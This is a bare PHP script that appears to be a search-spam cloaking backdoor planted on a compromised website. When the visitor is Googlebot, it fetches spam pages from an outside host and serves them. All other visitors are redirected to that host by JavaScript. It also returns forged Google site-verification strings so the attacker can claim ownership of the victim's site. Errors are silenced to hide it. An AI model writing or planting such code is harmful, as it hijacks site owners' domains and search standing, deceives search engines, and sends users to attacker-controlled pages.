<?php
error_reporting(0);
if($_GET['uu']!=""){
	if(stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false){
		
		//$str = GetFileContent("http://hy.jpssale.com/pages.php?".$_GET['uu']."|".$_SERVER["HTTP_HOST"]);
		$str = GetFileContent("http://hhy.jpssale.com/0421t/pages_info_kw.php?".$_GET['uu']."|".$_SERVER["HTTP_HOST"]);
		echo $str;
		exit;
	}else{
		echo '<script>document.location=("http://hhy.jpssale.com/0421t/go.php?'.trim($_GET['uu']).'");</script>';
		exit; 	
	}	
}
if($_GET['google']!=""){
	echo 'google-site-verification: google'.$_GET['google'].'.html';exit;
}

$_SERVER['HTTP_REFERER'];
function GetFileContent($url){
	if(function_exists('file_get_contents')) {
		$file_contents = file_get_contents($url);
	} else {
		$ch = curl_init();
		$timeout = 5; 
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
		$file_contents = curl_exec($ch);
		curl_close($ch);
	}
	return $file_contents;
}


?>